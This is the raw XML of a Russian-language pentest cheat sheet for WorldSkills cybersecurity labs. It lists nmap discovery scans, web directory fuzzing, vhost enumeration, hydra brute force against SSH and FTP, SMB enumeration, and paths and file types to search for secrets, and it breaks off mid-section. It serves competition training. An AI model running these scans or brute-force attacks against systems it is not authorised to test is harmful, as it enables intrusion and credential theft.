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t>WORLDskills Cybersecurity</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:br/>
        <w:t>PENTEST CHEAT SHEET</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>ALT Linux 11 K + Kali Linux / VirtualBox</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Практическая шпаргалка для разрешённых учебных стендов и соревнований</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>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fldSimple w:instr="TOC \o &quot;1-3&quot; \h \z \u"/>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Примечание: после открытия документа в Word/LibreOffice обновите поле оглавления, чтобы отобразились актуальные номера страниц.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Главный алгоритм Pentest</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. Определить свою сеть</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>2. Найти хосты</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>3. Найти открытые порты</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>4. Определить сервисы и версии</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>5. Enumerate каждый сервис</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>6. Найти usernames / directories / shares / версии</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>7. Проверить default credentials</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>8. Targeted brute force</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>9. Получить initial access</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>10. Enumeration изнутри</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>11. Privilege Escalation</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>12. Credentials / secrets</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>13. Lateral movement</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ↓</w:t>
        <w:br/>
        <w:t>14. FLAG / требуемый результат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Главное правило: ENUMERATION &gt; BRUTE FORCE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Архитектура: ALT Linux 11 K + Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>┌───────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│       ALT Linux 11 K          │</w:t>
        <w:br/>
        <w:t>│       основная ОС             │</w:t>
        <w:br/>
        <w:t>│  Terminal / Browser / Notes   │</w:t>
        <w:br/>
        <w:t>│              │                │</w:t>
        <w:br/>
        <w:t>│         VirtualBox            │</w:t>
        <w:br/>
        <w:t>│              │                │</w:t>
        <w:br/>
        <w:t>│       ┌──────▼───────┐        │</w:t>
        <w:br/>
        <w:t>│       │ Kali Linux   │        │</w:t>
        <w:br/>
        <w:t>│       │ Pentest VM   │        │</w:t>
        <w:br/>
        <w:t>│       └──────┬───────┘        │</w:t>
        <w:br/>
        <w:t>└──────────────┼────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">               │</w:t>
        <w:br/>
        <w:t xml:space="preserve">          TARGET NETWORK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Для лаборатории удобно использовать Host-only или Internal Network. Если Kali нужен Интернет, можно дать ему два адаптера: NAT + Host-only/Internal Network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Первичная подготовка Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1. Проверка сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ip a</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ip -br a</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ip route</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>resolvectl status 2&gt;/dev/null || cat /etc/resolv.conf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ping -c 3 1.1.1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ping -c 3 google.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>hostname</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>hostname -I</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2. Установка основного набора</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo apt update</w:t>
        <w:br/>
        <w:t>sudo apt full-upgrade -y</w:t>
        <w:br/>
        <w:br/>
        <w:t>sudo apt install -y \</w:t>
        <w:br/>
        <w:t>nmap masscan arp-scan netdiscover dnsutils whois \</w:t>
        <w:br/>
        <w:t>curl wget git jq tmux vim nano netcat-openbsd socat \</w:t>
        <w:br/>
        <w:t>python3 python3-pip ffuf gobuster feroxbuster nikto whatweb \</w:t>
        <w:br/>
        <w:t>hydra medusa john hashcat hashid seclists wordlists \</w:t>
        <w:br/>
        <w:t>smbclient smbmap enum4linux-ng ldap-utils snmp onesixtyone \</w:t>
        <w:br/>
        <w:t>ftp ssh sshpass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3. Wordlists</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ls /usr/share/wordlists/</w:t>
        <w:br/>
        <w:t>ls /usr/share/seclists/</w:t>
        <w:br/>
        <w:br/>
        <w:t>sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz 2&gt;/dev/null || true</w:t>
        <w:br/>
        <w:t>wc -l /usr/share/wordlists/rockyou.txt 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ключевые каталоги: /usr/share/wordlists/, /usr/share/seclists/Passwords/, Usernames/, Discovery/Web-Content/, Discovery/DNS/, Fuzzing/.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Рабочая директория и tmux</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>mkdir -p ~/WS-PENTEST/{recon,scans,web,loot,hashes,exploits,notes,loot/creds}</w:t>
        <w:br/>
        <w:t>cd ~/WS-PENTEST</w:t>
        <w:br/>
        <w:br/>
        <w:t>tmux</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>tmux: Ctrl+B " — горизонтальное разделение; Ctrl+B % — вертикальное; Ctrl+B C — новое окно; Ctrl+B N — следующее окно; tmux attach — вернуться.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Discovery — поиск хостов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1. Определить сеть</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ip route</w:t>
        <w:br/>
        <w:t># Например: 192.168.56.0/24 dev eth1</w:t>
        <w:br/>
        <w:t># NETWORK = 192.168.56.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2. Найти живые хосты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo nmap -sn 192.168.56.0/24</w:t>
        <w:br/>
        <w:t>sudo arp-scan --localnet</w:t>
        <w:br/>
        <w:t>sudo netdiscover -r 192.168.56.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3. Сохранить результаты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo nmap -sn 192.168.56.0/24 -oA ~/WS-PENTEST/recon/discovery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Nmap — основная разведка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap TARGET</w:t>
        <w:br/>
        <w:t>nmap -sV TARGET</w:t>
        <w:br/>
        <w:t>nmap -sC TARGET</w:t>
        <w:br/>
        <w:t>nmap -sC -sV TARGET</w:t>
        <w:br/>
        <w:t>sudo nmap -p- TARGET</w:t>
        <w:br/>
        <w:t>sudo nmap -p- -sV TARGET</w:t>
        <w:br/>
        <w:t>sudo nmap -sU --top-ports 100 TARGET</w:t>
        <w:br/>
        <w:t>sudo nmap -A TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1. Рекомендуемая схема</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo nmap -p- --min-rate 2000 TARGET</w:t>
        <w:br/>
        <w:br/>
        <w:t># Затем, например:</w:t>
        <w:br/>
        <w:t>sudo nmap -sC -sV -p22,80,139,445,3306,8080 TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2. Сохранение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo nmap -sC -sV -p- TARGET -oA ~/WS-PENTEST/scans/TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Если ICMP discovery блокируется, попробуй nmap -Pn TARGET.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Таблица целей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>HOST             PORT    SERVICE       VERSION       ACTION</w:t>
        <w:br/>
        <w:t>----------------------------------------------------------------</w:t>
        <w:br/>
        <w:t>192.168.56.10    22      SSH           OpenSSH       SSH enum</w:t>
        <w:br/>
        <w:t>192.168.56.10    80      HTTP          Apache        WEB</w:t>
        <w:br/>
        <w:t>192.168.56.10    445     SMB           Samba         SMB enum</w:t>
        <w:br/>
        <w:t>192.168.56.10    3306    MySQL         MySQL         DB</w:t>
        <w:br/>
        <w:t>192.168.56.10    8080    HTTP          Tomcat        WEB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Не атакуй хаотично. Для каждого найденного сервиса фиксируй версию, способ enumeration и следующий шаг.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Web Pentest</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1. Первичная проверка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl -I http://TARGET</w:t>
        <w:br/>
        <w:t>curl -i http://TARGET</w:t>
        <w:br/>
        <w:t>whatweb http://TARGET</w:t>
        <w:br/>
        <w:t>nikto -h http://TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.2. Directory enumeration — FFUF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ffuf -u http://TARGET/FUZZ \</w:t>
        <w:br/>
        <w:t>-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t>ffuf -u http://TARGET/FUZZ \</w:t>
        <w:br/>
        <w:t>-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \</w:t>
        <w:br/>
        <w:t>-e .php,.html,.txt,.bak,.zip,.conf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.3. Gobuster</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>gobuster dir \</w:t>
        <w:br/>
        <w:t>-u http://TARGET \</w:t>
        <w:br/>
        <w:t>-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t>gobuster dir \</w:t>
        <w:br/>
        <w:t>-u http://TARGET \</w:t>
        <w:br/>
        <w:t>-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \</w:t>
        <w:br/>
        <w:t>-x php,txt,bak,zip,conf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4. Что искать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/admin</w:t>
        <w:br/>
        <w:t>/login</w:t>
        <w:br/>
        <w:t>/administrator</w:t>
        <w:br/>
        <w:t>/backup</w:t>
        <w:br/>
        <w:t>/backups</w:t>
        <w:br/>
        <w:t>/config</w:t>
        <w:br/>
        <w:t>/test</w:t>
        <w:br/>
        <w:t>/dev</w:t>
        <w:br/>
        <w:t>/api</w:t>
        <w:br/>
        <w:t>/uploads</w:t>
        <w:br/>
        <w:t>/files</w:t>
        <w:br/>
        <w:t>/.git</w:t>
        <w:br/>
        <w:t>/.env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5. HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl -k -I https://TARGET</w:t>
        <w:br/>
        <w:t>nmap --script ssl-enum-ciphers -p443 TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6. robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl http://TARGET/robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. VHost и DNS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1. VHost</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ffuf -u http://TARGET/ \</w:t>
        <w:br/>
        <w:t>-H "Host: FUZZ.example.local" \</w:t>
        <w:br/>
        <w:t>-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2. /etc/hosts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo nano /etc/hosts</w:t>
        <w:br/>
        <w:br/>
        <w:t># Пример:</w:t>
        <w:br/>
        <w:t>192.168.56.10 app.example.local</w:t>
        <w:br/>
        <w:t>192.168.56.10 admin.example.local</w:t>
        <w:br/>
        <w:t>192.168.56.10 dev.example.local</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3. DNS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>dig TARGET</w:t>
        <w:br/>
        <w:t>dig A example.local</w:t>
        <w:br/>
        <w:t>dig MX example.local</w:t>
        <w:br/>
        <w:t>dig NS example.local</w:t>
        <w:br/>
        <w:t>dig -x IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4. Быстрый список имён</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>for sub in www mail ftp vpn dev test admin portal git api; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dig +short "$sub.example.local"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. Burp Suite и Web Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>burpsuite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Основной рабочий цикл: Proxy → Intercept → Repeater → Intruder.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Перед brute force проверь default credentials, username enumeration, POST endpoint, параметры, CSRF, cookies, redirects и rate limiting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.1. Пример POST</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl -X POST \</w:t>
        <w:br/>
        <w:t>-d 'username=admin&amp;password=test' \</w:t>
        <w:br/>
        <w:t>http://TARGET/login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.2. Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl -b 'session=VALUE' http://TARGET/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>11. SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sV -p22 TARGET</w:t>
        <w:br/>
        <w:t>ssh user@TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1. Targeted brute force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>hydra -l admin -P passwords.txt ssh://TARGET</w:t>
        <w:br/>
        <w:t>hydra -L users.txt -P passwords.txt -t 4 ssh://TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Сначала проверяй известные/типовые учётные данные и небольшие списки; большой wordlist используй только если это оправдано условиями задачи.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>12. FTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sC -sV -p21 TARGET</w:t>
        <w:br/>
        <w:t>ftp TARGET</w:t>
        <w:br/>
        <w:t>hydra -L users.txt -P passwords.txt ftp://TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Проверь anonymous-доступ и содержимое доступных файлов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>13. SMB / Windows shares</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sC -sV -p139,445 TARGET</w:t>
        <w:br/>
        <w:t>enum4linux-ng TARGET</w:t>
        <w:br/>
        <w:t>smbclient -L //TARGET -N</w:t>
        <w:br/>
        <w:t>smbclient //TARGET/SHARE -N</w:t>
        <w:br/>
        <w:t>smbclient //TARGET/SHARE -U USER</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ищи shares, пользователей, domain/workgroup, password policy, читаемые/записываемые каталоги, скрипты, конфигурации и backup-файлы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>13.1. Полезные расширения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>*.txt</w:t>
        <w:br/>
        <w:t>*.conf</w:t>
        <w:br/>
        <w:t>*.ini</w:t>
        <w:br/>
        <w:t>*.xml</w:t>
        <w:br/>
        <w:t>*.config</w:t>
        <w:br/>
        <w:t>*.bak</w:t>
        <w:br/>
        <w:t>*.old</w:t>
        <w:br/>
        <w:t>*.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
